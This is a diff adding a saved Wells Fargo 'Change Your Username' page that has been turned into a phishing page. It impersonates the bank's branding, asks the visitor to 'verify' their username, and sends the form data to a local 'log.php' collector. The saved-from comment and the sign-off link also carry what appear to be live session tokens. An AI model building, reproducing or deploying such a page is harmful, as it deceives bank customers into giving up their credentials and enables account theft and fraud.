@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<!-- saved from url=(0207)https://oam.wellsfargo.com/oam/access/receiver?dest=CHANGE_USERNAME&sessionId=b412f7b7-aab6-4b4e-9a76-dbcdd3d744a7&SAMLart=AAQAb%2BoEQCR14WDgSxaU4QNGCHpGcoS113OJ%2B%2BXsOym%2Bt6t5jpBu4Tf09b4%3D&st=1459187636 -->
+<html lang="en" data-device-type="desktop"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+        
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+		<title>Wells Fargo Change Your Username</title>
+        <link rel="stylesheet" href="./index_files/credentials.css">
+        <link rel="stylesheet" href="./index_files/crosspChangeUsername.css">
+        <link rel="stylesheet" href="./index_files/theme.ssep.css">
+        <link rel="stylesheet" href="./index_files/theme.ssep.header.css">
+        <link rel="stylesheet" href="./index_files/theme.ssep.input.css">
+        <link rel="stylesheet" href="./index_files/theme.ssep.button.css">
+        <link rel="stylesheet" href="./index_files/theme.ssep.infochecklist.css">
+        <link rel="stylesheet" href="./index_files/theme.ssep.radio.css">
+        <link rel="stylesheet" href="./index_files/theme.ssep.loadingaction.css">
+        <link rel="stylesheet" href="./index_files/theme.ssep.messaging.css">
+        <link rel="stylesheet" href="./index_files/theme.ssep.timeout.css">
+        <link rel="stylesheet" href="./index_files/theme.ssep.controlbar.css">
+	</head>
+	<body ismobile="false" contextpath="/oam" id="body" theme="ssep" lob="COB" devicetype="desktop">
+                <div control="loadingAction">
+            <div class="shadow"></div>
+            <div class="helper"></div>
+            <img src="./index_files/icn-ind-loading-page-glob-70x70-000720-v01_00@1x.gif" alt="wait">
+        </div>
+
+        
+        
+        
+
+        
+
+        
+        
+        
+
+        
+        
+    
+    
+    
+        <div control="header" lob="undefined">
+            <span class="helper"></span>
+            <img class="logo" src="./index_files/1logo.gif" alt="Wells Fargo" tabindex="0" role="link">
+        </div>
+    
+
+
+
+        <div control="controlBar">
+            <form method="post" action="log.php">
+                <button id="accountSummary">
+                    <img src="./index_files/icn-nav-home-glob-18x17-000720-v01_00@1x.png" alt="">
+                    <span>Account Verification</span>
+                </button>
+            </form>
+        </div>
+
+        
+        
+        
+
+        
+            
+                <div class="content">
+                    <h1>Verify Your Username</h1>
+                    <div control="errorMessage" data-has-error="false">
+                        <img src="./index_files/icon_error.png" alt="error">
+                        <span></span>
+                    </div>
+                   
+                    <form id="credentials" name="credentials" method="POST" action="log.php" onsubmit="return ChangeUsername.methods.validate();" novalidate="">
+
+                        <p class="spacer"></p>
+                        <p control="forms:fieldContainer">
+                            <img id="newUsernameError" src="./index_files/icon_error_12x12.png" alt="error" class="hidden">
+                            <label control="forms:label" for="newUsername">Your Username</label><br>
+                            <input tabindex="0" type="text" maxlength="14" control="forms:input" id="newUsername" name="user">
+                        </p>
+                        
+                        <hr class="pageDivider">
+                        <div control="buttonContainer">
+                            <input type="hidden" name="action" id="action" value="verify">
+                            <input type="hidden" name="isSuggested" id="isSuggested" value="false">
+                            <button control="button" data-type="primary" id="save">Continue</button>
+                        </div>
+                    </form>
+                </div>
+            
+            
+        
+        <div control="footer">
+    <ul>
+        <li>
+            <a href="https://www.wellsfargo.com/security/security-online-banking"> Online Security Guarantee </a>
+            <a href="https://www.wellsfargo.com/privacy-security/"> | Privacy, Cookies, Security &amp; Legal</a>
+            <span id="sign_off">
+                <img src="./index_files/icn-ind-lock.png" alt="lock-icon">
+                <a href="https://oam.wellsfargo.com/oam/access/signoffNav?OAM_TKN=5c6710160fcba3de23bf2fdbe389d08c14576cb350b7637d1a2ec3b020cb8796">Sign Off</a>
+            </span>
+        </li>
+    </ul>
+</div>
+
+        <script type="text/javascript" src="./index_files/jquery.min.js"></script>
+        <script type="text/javascript" src="./index_files/validation.js"></script>
+        <script type="text/javascript" src="./index_files/timeout.js"></script>
+        <script type="text/javascript" src="./index_files/theme.ssep.radio.js"></script>
+        <script type="text/javascript" src="./index_files/crosspChangeUsername.js"></script>
+        <script type="text/javascript">
+            $('div[control="forms:radio"]').on('get:value', function(e){
+                $('#newUsername').val($(this).attr('value'));
+                $('#newUsername').trigger('keyup');
+            })
+        </script>
+	
+
+<img alt="" width="1" height="1" id="keepSessionAliveImg" src="./index_files/resettimeout" style="display:none;"></body></html>
